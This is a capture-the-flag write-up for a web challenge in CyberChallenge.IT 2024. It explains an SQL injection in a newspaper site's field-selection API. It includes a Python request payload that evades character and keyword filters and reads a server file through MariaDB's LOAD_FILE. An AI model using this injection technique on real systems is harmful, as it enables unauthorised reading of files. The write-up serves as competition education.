# CyberChallenge.IT 2024 - University CTF

## [web] The Cyberton Post (21 solves)

Have a look at my new newspaper website!

The flag is in `/flag_uwu.txt`

P.S.: I think I need a new keyboard

Site: [http://thecybertonpost.challs.external.open.ecsc2024.it:38210](http://thecybertonpost.challs.external.open.ecsc2024.it:38210)

Author: Lorenzo Leonardini <@pianka>

## Solution

The challenge is a simple blog/online newspaper. Posts and their content are fetched using an API that wants to resemble GraphQL, as it allows to specify what data you want from the object you are fetching. However, this feature is vulnerable to SQL injection.

The objective, though, is not to dump the database, but to read the flag from the file `/flag_uwu.txt`.

To complicate the attack, there are some filters in place that completely block the character `u`, as well as some words like `select`, `where`, `hex`, both from the request and the response. We are also informed by a comment that the flag does indeed contain many `U`s.

In mariadb, the file can be easily read with the `LOAD_FILE` function. However, some work needs to be done in order to both escape the `flag_uwu.txt` filename, and the flag leaked by the server.

The full intended payload makes use of base64, with appropriate replaces to escape the `u` and `U` characters with `@` and `!`:

```py
res = requests.post(f'{URL}/api/post/1', json={"fields":["REPLACE(REPLACE(TO_BASE64(LOAD_FILE(CONCAT('/flag_',CHR(0x75),'w',CHR(0x75),'.txt'))), CAST(CHR(0x75) AS VARCHAR(1)), '@'), CAST(CHR(0x55) AS VARCHAR(1)), '!') as flag -- -"]})

flag = res.json()['flag']
flag = flag.replace('@', 'u')
flag = flag.replace('!', 'U')
flag = base64.b64decode(flag.encode()).decode()
```
